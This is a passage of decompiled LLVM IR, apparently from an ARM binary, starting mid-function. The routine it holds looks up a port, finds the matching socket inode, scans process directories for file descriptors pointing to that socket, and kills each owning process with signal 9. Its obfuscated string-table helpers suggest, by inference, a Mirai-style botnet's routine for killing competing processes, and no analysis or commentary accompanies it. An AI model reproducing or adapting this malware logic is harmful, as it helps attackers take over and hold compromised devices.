  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c97c = load i32, i32* @r4, align 4
  %v6_c97c = load i32, i32* @r5, align 4
  %v9_c97c = load i32, i32* @r6, align 4
  %v12_c97c = load i32, i32* @r7, align 4
  %v15_c97c = load i32, i32* @r8, align 4
  %v18_c97c = load i32, i32* @sb, align 4
  %v21_c97c = load i32, i32* @sl, align 4
  %v24_c97c = load i32, i32* @fp, align 4
  %v27_c97c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c998 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c998, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9c4 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9c4, i32* @fp, align 4
  %v4_c9d0 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_c9d4 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9d4, i32* @sl, align 4
  %v0_c9d8 = load i32, i32* @r5, align 4
  %v3_c9e4 = bitcast i32* %stack_var_-8777 to i8*
  %v4_c9e4 = call i32 @__GI_memset(i8* %v3_c9e4, i32 %v0_c9d8, i32 4096)
  %v0_c9ec = load i32, i32* @r5, align 4
  %v3_c9f8 = bitcast i32* %stack_var_-4681 to i8*
  %v4_c9f8 = call i32 @__GI_memset(i8* %v3_c9f8, i32 %v0_c9ec, i32 4096)
  %v2_c9fc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9fc, i32* @sb, align 4
  %v0_ca00 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca00 = udiv i32 %v0_ca00, 256
  %v1_ca04 = urem i32 %v0_ca00, 256
  store i32 %v1_ca04, i32* @r4, align 4
  %v3_ca14 = trunc i32 %v3_ca00 to i8
  %v4_ca14 = call i32 @util_itoa(i8 %v3_ca14, i32 16, i32 %v2_c9fc)
  %v2_ca1c = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca20 = icmp eq i32 %v2_ca1c, 2
  br i1 %v7_ca20, label %dec_label_pc_cee4, label %dec_label_pc_ca28

dec_label_pc_ca28:                                ; preds = %entry, %dec_label_pc_cee4
  %v1_ca2c = call i32 @table_unlock_val(i32 13)
  %v1_ca34 = call i32 @table_unlock_val(i32 14)
  %v1_ca3c = call i32 @table_unlock_val(i32 15)
  %v1_ca44 = call i32 @table_unlock_val(i32 17)
  %v0_ca48 = load i32, i32* @r5, align 4
  %v2_ca50 = inttoptr i32 %v0_ca48 to i32*
  %v3_ca50 = call i32 @table_retrieve_val(i32 17, i32* %v2_ca50)
  %v0_ca54 = load i32, i32* @r5, align 4
  %v2_ca58 = call i32 @__libc_open(i32 %v3_ca50, i32 %v0_ca54)
  %v7_ca5c = icmp eq i32 %v2_ca58, -1
  store i32 %v2_ca58, i32* @r8, align 4
  br i1 %v7_ca5c, label %bb, label %dec_label_pc_ca6c.preheader

bb:                                               ; preds = %dec_label_pc_ca28
  %v1_ca64 = load i32, i32* @r5, align 4
  store i32 %v1_ca64, i32* @r4, align 4
  br label %dec_label_pc_ce80

dec_label_pc_ca6c.preheader:                      ; preds = %dec_label_pc_ca28
  %v4_ca7856 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca58)
  %v2_ca7c58 = icmp eq i32 %v4_ca7856, 0
  br i1 %v2_ca7c58, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84.lr.ph

dec_label_pc_ca84.lr.ph:                          ; preds = %dec_label_pc_ca6c.preheader
  %v2_cacc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca84.lr.ph, %dec_label_pc_ca6c.backedge
  %v3_ca88 = load i8, i8* %stack_var_-585, align 1
  %v4_ca88 = sext i8 %v3_ca88 to i32
  store i32 %v4_ca88, i32* @r3, align 4
  %v2_ca8c = icmp eq i8 %v3_ca88, 0
  br i1 %v2_ca8c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca84
  %v8_ca90 = icmp eq i8 %v3_ca88, 58
  br i1 %v8_ca90, label %.thread8, label %dec_label_pc_caa4

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cabc

bb126:                                            ; preds = %dec_label_pc_ca84
  br label %dec_label_pc_cabc

dec_label_pc_caa4:                                ; preds = %bb125
  %v1_caac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %bb127, %dec_label_pc_caa4
  %v0_caa8 = phi i32 [ %v1_caa8, %bb127 ], [ 0, %dec_label_pc_caa4 ]
  %v1_caa8 = add i32 %v0_caa8, 1
  %v2_caac = add i32 %v1_caa8, %v1_caac.pre
  %v3_caac = inttoptr i32 %v2_caac to i8*
  %v4_caac = load i8, i8* %v3_caac, align 1
  %v6_caac = zext i8 %v4_caac to i32
  store i32 %v6_caac, i32* @r3, align 4
  %v2_cab0 = icmp eq i8 %v4_caac, 0
  br i1 %v2_cab0, label %dec_label_pc_cabc, label %bb127

bb127:                                            ; preds = %dec_label_pc_caa8
  %v8_cab4 = icmp eq i8 %v4_caac, 58
  br i1 %v8_cab4, label %dec_label_pc_cabc, label %dec_label_pc_caa8

dec_label_pc_cabc:                                ; preds = %dec_label_pc_caa8, %bb127, %bb126, %.thread8
  %v1_cae8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_caa8, %bb127 ], [ %v1_caa8, %dec_label_pc_caa8 ]
  %v0_cabc = phi i32 [ %v4_ca88, %.thread8 ], [ %v4_ca88, %bb126 ], [ %v6_caac, %bb127 ], [ %v6_caac, %dec_label_pc_caa8 ]
  %v2_cabc = icmp eq i32 %v0_cabc, 0
  br i1 %v2_cabc, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cac4

dec_label_pc_ca6c.backedge:                       ; preds = %dec_label_pc_cabc, %dec_label_pc_cb8c, %dec_label_pc_cbd8, %dec_label_pc_cb08
  %v0_ca74 = load i32, i32* @r8, align 4
  %v4_ca78 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca74)
  %v2_ca7c = icmp eq i32 %v4_ca78, 0
  br i1 %v2_ca7c, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_cae8, 2
  %v2_cad0 = add i32 %v1_cac8, %v2_cacc
  %v1_cad4 = add i32 %v2_cad0, -545
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v2_cad8 = icmp eq i8 %v3_cad4, 0
  br i1 %v2_cad8, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_cac4
  %v8_cadc = icmp eq i8 %v3_cad4, 32
  br i1 %v8_cadc, label %.thread13, label %dec_label_pc_cae8

.thread13:                                        ; preds = %bb128
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb129:                                            ; preds = %dec_label_pc_cac4
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

dec_label_pc_cae8:                                ; preds = %bb128
  %v0_cae8 = load i32, i32* @r6, align 4
  %v2_cae8 = add i32 %v0_cae8, %v1_cae8
  br label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %bb130, %dec_label_pc_cae8
  %v0_cafc16 = phi i32 [ %v1_cafc, %bb130 ], [ %v1_cac8, %dec_label_pc_cae8 ]
  %v0_cb0018 = phi i32 [ %v1_cb00, %bb130 ], [ %v2_cae8, %dec_label_pc_cae8 ]
  %v1_caf0 = add i32 %v0_cb0018, 3
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf4 = icmp eq i8 %v3_caf0, 0
  br i1 %v2_caf4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_caf0
  %v1_cafc17 = add i32 %v0_cafc16, 1
  store i32 %v1_cafc17, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb130:                                            ; preds = %dec_label_pc_caf0
  %v8_caf8 = icmp eq i8 %v3_caf0, 32
  %v1_cafc = add i32 %v0_cafc16, 1
  store i32 %v1_cafc, i32* @r5, align 4
  %v1_cb00 = add i32 %v0_cb0018, 1
  br i1 %v8_caf8, label %dec_label_pc_cb08, label %dec_label_pc_caf0

dec_label_pc_cb08:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb14 = phi i32 [ %v1_cafc17, %.thread15 ], [ %v1_cac8, %.thread13 ], [ %v1_cac8, %bb129 ], [ %v1_cafc, %bb130 ]
  %v0_cb08 = load i32, i32* @r6, align 4
  %v2_cb08 = add i32 %v0_cb08, %v1_cac8
  store i32 %v2_cb08, i32* @r4, align 4
  %v2_cb14 = add i32 %v1_cb14, %v2_cacc
  store i32 0, i32* @r7, align 4
  %v3_cb1c = add i32 %v2_cb14, -545
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 0, i8* %v4_cb1c, align 1
  %v0_cb20 = load i32, i32* @r4, align 4
  %v1_cb24 = inttoptr i32 %v0_cb20 to i8*
  %v2_cb24 = call i32 @util_strlen(i8* %v1_cb24)
  store i32 %v2_cb24, i32* @r1, align 4
  %v0_cb30 = load i32, i32* @r4, align 4
  %v3_cb34 = inttoptr i32 %v0_cb30 to i8*
  %v4_cb34 = call i32 @util_stristr(i8* %v3_cb34, i32 %v2_cb24, i32 %v2_c9fc)
  %v7_cb38 = icmp eq i32 %v4_cb34, -1
  br i1 %v7_cb38, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb54.preheader

dec_label_pc_cb54.preheader:                      ; preds = %dec_label_pc_cb08
  %v1_cb3c = load i32, i32* @r7, align 4
  %v1_cb40 = load i32, i32* @r6, align 4
  %v2_cb40 = load i32, i32* @r5, align 4
  %v3_cb40 = add i32 %v2_cb40, %v1_cb40
  store i32 %v1_cb3c, i32* @lr, align 4
  %v1_cb5448 = add i32 %v3_cb40, 2
  %v2_cb5449 = inttoptr i32 %v1_cb5448 to i8*
  %v3_cb5450 = load i8, i8* %v2_cb5449, align 1
  %v4_cb5451 = zext i8 %v3_cb5450 to i32
  store i32 %v4_cb5451, i32* @r3, align 4
  %v2_cb5852 = icmp eq i8 %v3_cb5450, 0
  %v1_cb5c54 = add i32 %v2_cb40, 2
  br i1 %v2_cb5852, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb54.preheader, %dec_label_pc_cb54.backedge
  %v0_cb8c83 = phi i32 [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb74.pr = phi i32 [ %v0_cb74.pr70, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_ce94 = phi i32 [ %v0_ce9473, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb5c78 = phi i32 [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v1_cb5c54, %dec_label_pc_cb54.preheader ]
  %v0_cb84 = phi i32 [ %v0_cb54, %dec_label_pc_cb54.backedge ], [ %v3_cb40, %dec_label_pc_cb54.preheader ]
  %v1_cb68 = phi i32 [ %v4_cb54, %dec_label_pc_cb54.backedge ], [ %v4_cb5451, %dec_label_pc_cb54.preheader ]
  %v7_cb64 = icmp eq i32 %v1_cb68, 9
  br i1 %v7_cb64, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb64
  %v8_cb68 = icmp eq i32 %v1_cb68, 32
  br i1 %v8_cb68, label %.thread27, label %dec_label_pc_cb74

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb80

bb132:                                            ; preds = %dec_label_pc_cb64
  br label %dec_label_pc_cb80

dec_label_pc_cb74:                                ; preds = %bb131
  %v7_cb74 = icmp eq i32 %v0_cb74.pr, 1
  br i1 %v7_cb74, label %dec_label_pc_ce94, label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cb74
  %v0_cb8075 = phi i32 [ %v1_ce94, %dec_label_pc_ce94 ], [ %v0_ce94, %dec_label_pc_cb74 ]
  br label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb7c
  %v0_cb80 = phi i32 [ %v0_ce94, %.thread27 ], [ %v0_ce94, %bb132 ], [ %v0_cb8075, %dec_label_pc_cb7c ]
  %v0_cb74.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb7c ]
  %v7_cb88 = icmp sgt i32 %v0_cb80, 6
  br i1 %v7_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb54.backedge

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb54.backedge, %dec_label_pc_cb80, %dec_label_pc_cb54.preheader
  %v1_cbdc = phi i32 [ %v1_cb5c54, %dec_label_pc_cb54.preheader ], [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v0_cb5c78, %dec_label_pc_cb80 ]
  %v0_cb8c = phi i32 [ %v1_cb3c, %dec_label_pc_cb54.preheader ], [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v2_cb8c = icmp eq i32 %v0_cb8c, 0
  br i1 %v2_cb8c, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb8c
  %v2_cba0 = add i32 %v1_cbdc, %v2_cacc
  %v1_cba4 = add i32 %v2_cba0, -545
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v2_cba8 = icmp eq i8 %v3_cba4, 0
  br i1 %v2_cba8, label %dec_label_pc_cbd8, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb98
  %v8_cbac = icmp eq i8 %v3_cba4, 32
  br i1 %v8_cbac, label %dec_label_pc_cbd8, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %bb133
  %v2_cbb4 = add i32 %v1_cbdc, %v1_cb40
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %bb134, %dec_label_pc_cbb4
  %v0_cbc430 = phi i32 [ %v1_cbc4, %bb134 ], [ %v1_cbdc, %dec_label_pc_cbb4 ]
  %v0_cbb8 = phi i32 [ %v1_cbb8, %bb134 ], [ %v2_cbb4, %dec_label_pc_cbb4 ]
  %v1_cbb8 = add i32 %v0_cbb8, 1
  %v2_cbb8 = inttoptr i32 %v1_cbb8 to i8*
  %v3_cbb8 = load i8, i8* %v2_cbb8, align 1
  %v2_cbbc = icmp eq i8 %v3_cbb8, 0
  br i1 %v2_cbbc, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbb8
  %v1_cbc431 = add i32 %v0_cbc430, 1
  br label %dec_label_pc_cbcc

bb134:                                            ; preds = %dec_label_pc_cbb8
  %v8_cbc0 = icmp eq i8 %v3_cbb8, 32
  %v1_cbc4 = add i32 %v0_cbc430, 1
  br i1 %v8_cbc0, label %dec_label_pc_cbcc, label %dec_label_pc_cbb8

dec_label_pc_cbcc:                                ; preds = %bb134, %.thread29
  %v1_cbd4 = phi i32 [ %v1_cbc431, %.thread29 ], [ %v1_cbc4, %bb134 ]
  %v2_cbd4 = add i32 %v1_cbd4, %v2_cacc
  br label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %dec_label_pc_cb98, %bb133, %dec_label_pc_cbcc
  %v2_cbe4 = phi i32 [ %v2_cba0, %dec_label_pc_cb98 ], [ %v2_cba0, %bb133 ], [ %v2_cbd4, %dec_label_pc_cbcc ]
  %v2_cbdc = add i32 %v1_cbdc, %v1_cb40
  store i32 %v2_cbdc, i32* @r4, align 4
  %v3_cbe4 = add i32 %v2_cbe4, -545
  %v4_cbe4 = inttoptr i32 %v3_cbe4 to i8*
  store i8 0, i8* %v4_cbe4, align 1
  %v1_cbe8 = inttoptr i32 %v2_cbdc to i8*
  %v2_cbe8 = call i32 @util_strlen(i8* %v1_cbe8)
  %v8_cbf0 = icmp sgt i32 %v2_cbe8, 15
  br i1 %v8_cbf0, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cbf4

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbd8
  %v0_cbf8 = load i32, i32* @r4, align 4
  %v2_cbfc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbfc, i32* @r0, align 4
  %v2_cc00 = bitcast i32* %stack_var_-56 to i8*
  %v3_cc00 = call i32 @util_strcpy(i8* %v2_cc00, i32 %v0_cbf8)
  br label %dec_label_pc_cc04

dec_label_pc_cc04.loopexit:                       ; preds = %dec_label_pc_ca6c.backedge, %dec_label_pc_ca6c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cc04.loopexit, %dec_label_pc_cbf4
  %v1_cc14.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc04.loopexit ], [ %v2_cc00, %dec_label_pc_cbf4 ]
  %v2_cc10.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc04.loopexit ], [ %v2_cbfc, %dec_label_pc_cbf4 ]
  %v0_cc04 = load i32, i32* @r8, align 4
  %v1_cc08 = call i32 @__GI___libc_close(i32 %v0_cc04)
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14.pre-phi)
  store i32 %v2_cc14, i32* @r4, align 4
  %v2_cc18 = icmp eq i32 %v2_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_cec0, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v3_cc28 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_cc2c = call i32 @__GI_opendir(i32 %v3_cc28)
  store i32 %v1_cc2c, i32* @sb, align 4
  %v2_cc30 = icmp eq i32 %v1_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce60, label %dec_label_pc_cc40.preheader

dec_label_pc_cc40.preheader:                      ; preds = %dec_label_pc_cc20
  store i32 0, i32* @r5, align 4
  %v1_cc4443 = inttoptr i32 %v1_cc2c to i32*
  %v2_cc4444 = call i32 @__GI_readdir(i32* %v1_cc4443)
  %v2_cc4846 = icmp eq i32 %v2_cc4444, 0
  br i1 %v2_cc4846, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc40.loopexit:                       ; preds = %dec_label_pc_cc58, %dec_label_pc_cc68, %dec_label_pc_ccd4
  %v0_cc40 = load i32, i32* @sb, align 4
  %v1_cc44 = inttoptr i32 %v0_cc40 to i32*
  %v2_cc44 = call i32 @__GI_readdir(i32* %v1_cc44)
  %v2_cc48 = icmp eq i32 %v2_cc44, 0
  br i1 %v2_cc48, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc50.preheader:                      ; preds = %dec_label_pc_cc40.preheader, %dec_label_pc_cc40.loopexit
  %v0_cc5891 = phi i32 [ %v2_cc44, %dec_label_pc_cc40.loopexit ], [ %v2_cc4444, %dec_label_pc_cc40.preheader ]
  br label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc50.preheader, %dec_label_pc_ce3c
  %v0_cc70 = phi i32 [ %v0_cc5891, %dec_label_pc_cc50.preheader ], [ %v2_ce48, %dec_label_pc_ce3c ]
  %v0_cc50 = load i32, i32* @r5, align 4
  %v2_cc50 = icmp eq i32 %v0_cc50, 0
  br i1 %v2_cc50, label %dec_label_pc_cc58, label %dec_label_pc_ce54

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc50
  %v1_cc58 = add i32 %v0_cc70, 11
  %v2_cc58 = inttoptr i32 %v1_cc58 to i8*
  %v3_cc58 = load i8, i8* %v2_cc58, align 1
  %v4_cc58 = zext i8 %v3_cc58 to i32
  %v1_cc5c = add nsw i32 %v4_cc58, -48
  %tmp = icmp ugt i32 %v1_cc5c, 9
  br i1 %tmp, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc58
  store i32 %v1_cc58, i32* @r7, align 4
  %v3_cc74 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cc80 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cc74)
  %v2_cc88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cc8c = load i32, i32* @r7, align 4
  %v1_cc90 = load i32, i32* @sl, align 4
  %v2_cc90 = add i32 %v1_cc90, %v2_cc88
  store i32 %v2_cc90, i32* @r0, align 4
  %v2_cc94 = inttoptr i32 %v2_cc90 to i8*
  %v3_cc94 = call i32 @util_strcpy(i8* %v2_cc94, i32 %v0_cc8c)
  %v2_cc9c = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v2_cc9c, i32* @r4, align 4
  %v2_ccac = inttoptr i32 %v0_cca0 to i32*
  %v3_ccac = call i32 @table_retrieve_val(i32 14, i32* %v2_ccac)
  %v0_ccb4 = load i32, i32* @r4, align 4
  %v1_ccb4 = load i32, i32* @sl, align 4
  %v2_ccb4 = add i32 %v1_ccb4, %v0_ccb4
  store i32 %v2_ccb4, i32* @r0, align 4
  %v2_ccb8 = inttoptr i32 %v2_ccb4 to i8*
  %v3_ccb8 = call i32 @util_strcpy(i8* %v2_ccb8, i32 %v3_ccac)
  %v3_ccc8 = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cccc = icmp eq i32 %v3_ccc8, -1
  br i1 %v7_cccc, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cc68
  %v0_ccd4 = load i32, i32* @r5, align 4
  %v2_ccdc = inttoptr i32 %v0_ccd4 to i32*
  %v3_ccdc = call i32 @table_retrieve_val(i32 13, i32* %v2_ccdc)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cce8 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_ccdc)
  %v2_ccf0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_ccf4 = load i32, i32* @r7, align 4
  %v1_ccf8 = load i32, i32* @sl, align 4
  %v2_ccf8 = add i32 %v1_ccf8, %v2_ccf0
  store i32 %v2_ccf8, i32* @r0, align 4
  %v2_ccfc = inttoptr i32 %v2_ccf8 to i8*
  %v3_ccfc = call i32 @util_strcpy(i8* %v2_ccfc, i32 %v0_ccf4)
  %v2_cd04 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd08 = load i32, i32* @r5, align 4
  store i32 %v2_cd04, i32* @r4, align 4
  %v2_cd14 = inttoptr i32 %v0_cd08 to i32*
  %v3_cd14 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd14)
  %v0_cd1c = load i32, i32* @r4, align 4
  %v1_cd1c = load i32, i32* @sl, align 4
  %v2_cd1c = add i32 %v1_cd1c, %v0_cd1c
  store i32 %v2_cd1c, i32* @r0, align 4
  %v2_cd20 = inttoptr i32 %v2_cd1c to i8*
  %v3_cd20 = call i32 @util_strcpy(i8* %v2_cd20, i32 %v3_cd14)
  %v1_cd28 = call i32 @__GI_opendir(i32 %v2_c9d4)
  store i32 %v1_cd28, i32* @r8, align 4
  %v2_cd2c = icmp eq i32 %v1_cd28, 0
  br i1 %v2_cd2c, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cd34.preheader

dec_label_pc_cd34.preheader:                      ; preds = %dec_label_pc_ccd4
  %v1_cd3838 = inttoptr i32 %v1_cd28 to i32*
  %v2_cd3839 = call i32 @__GI_readdir(i32* %v1_cd3838)
  store i32 %v2_cd3839, i32* @r6, align 4
  %v2_cd3c41 = icmp eq i32 %v2_cd3839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c41, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd34.loopexit:                       ; preds = %dec_label_pc_cd54, %dec_label_pc_cdec
  %v0_cd34 = load i32, i32* @r8, align 4
  %v1_cd38 = inttoptr i32 %v0_cd34 to i32*
  %v2_cd38 = call i32 @__GI_readdir(i32* %v1_cd38)
  store i32 %v2_cd38, i32* @r6, align 4
  %v2_cd3c = icmp eq i32 %v2_cd38, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd4cthread-pre-split:                ; preds = %dec_label_pc_cd34.preheader, %dec_label_pc_cd34.loopexit
  %v0_cd4c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd4c

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cd4cthread-pre-split, %dec_label_pc_ce14
  %v0_cd4c = phi i32 [ %v0_cd4c.pr, %dec_label_pc_cd4cthread-pre-split ], [ 1, %dec_label_pc_ce14 ]
  %v2_cd4c = icmp eq i32 %v0_cd4c, 0
  br i1 %v2_cd4c, label %dec_label_pc_cd54, label %dec_label_pc_ce3c

dec_label_pc_cd54:                                ; preds = %dec_label_pc_cd4c
  %v0_cd54 = call i32 @util_zero()
  %v0_cd58 = load i32, i32* @r5, align 4
  %v2_cd60 = inttoptr i32 %v0_cd58 to i32*
  %v3_cd60 = call i32 @table_retrieve_val(i32 13, i32* %v2_cd60)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cd6c = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cd60)
  %v2_cd74 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd78 = load i32, i32* @r7, align 4
  %v1_cd7c = load i32, i32* @sl, align 4
  %v2_cd7c = add i32 %v1_cd7c, %v2_cd74
  store i32 %v2_cd7c, i32* @r0, align 4
  %v2_cd80 = inttoptr i32 %v2_cd7c to i8*
  %v3_cd80 = call i32 @util_strcpy(i8* %v2_cd80, i32 %v0_cd78)
  %v2_cd88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v2_cd88, i32* @r4, align 4
  %v2_cd98 = inttoptr i32 %v0_cd8c to i32*
  %v3_cd98 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd98)
  %v0_cda0 = load i32, i32* @r4, align 4
  %v1_cda0 = load i32, i32* @sl, align 4
  %v2_cda0 = add i32 %v1_cda0, %v0_cda0
  store i32 %v2_cda0, i32* @r0, align 4
  %v2_cda4 = inttoptr i32 %v2_cda0 to i8*
  %v3_cda4 = call i32 @util_strcpy(i8* %v2_cda4, i32 %v3_cd98)
  %v2_cdac = call i32 @util_strlen(i8* %v3_c9f8)
  %v1_cdb4 = load i32, i32* @sl, align 4
  %v2_cdb4 = add i32 %v1_cdb4, %v2_cdac
  store i32 %v2_cdb4, i32* @r0, align 4
  %v2_cdb8 = inttoptr i32 %v2_cdb4 to i8*
  %v3_cdb8 = call i32 @util_strcpy(i8* %v2_cdb8, i32 ptrtoint (i32* @global_var_1a778.69 to i32))
  %v2_cdc0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cdc4 = load i32, i32* @r6, align 4
  %v1_cdc4 = add i32 %v0_cdc4, 11
  %v1_cdc8 = load i32, i32* @sl, align 4
  %v2_cdc8 = add i32 %v1_cdc8, %v2_cdc0
  store i32 %v2_cdc8, i32* @r0, align 4
  %v2_cdcc = inttoptr i32 %v2_cdc8 to i8*
  %v3_cdcc = call i32 @util_strcpy(i8* %v2_cdcc, i32 %v1_cdc4)
  %v3_cddc = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cde0 = icmp eq i32 %v3_cddc, -1
  br i1 %v7_cde0, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cd54
  %v2_cdec = call i32 @util_strlen(i8* %v3_c9e4)
  store i32 %v2_cdec, i32* @r1, align 4
  %v4_ce00 = call i32 @util_stristr(i8* %v3_c9e4, i32 %v2_cdec, i32 %v2_cc10.pre-phi)
  %v7_ce04 = icmp eq i32 %v4_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_ce14

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cdec
  %v0_ce0c = load i32, i32* @r7, align 4
  %v2_ce14 = inttoptr i32 %v0_ce0c to i8*
  %v3_ce14 = call i32 @util_atoi(i8* %v2_ce14, i32 10)
  %v2_ce1c = call i32 @kill(i32 %v3_ce14, i32 9)
  %v0_ce20 = load i32, i32* @r8, align 4
  %v1_ce24 = inttoptr i32 %v0_ce20 to i32*
  %v2_ce24 = call i32 @__GI_readdir(i32* %v1_ce24)
  store i32 %v2_ce24, i32* @r6, align 4
  %v2_ce28 = icmp eq i32 %v2_ce24, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
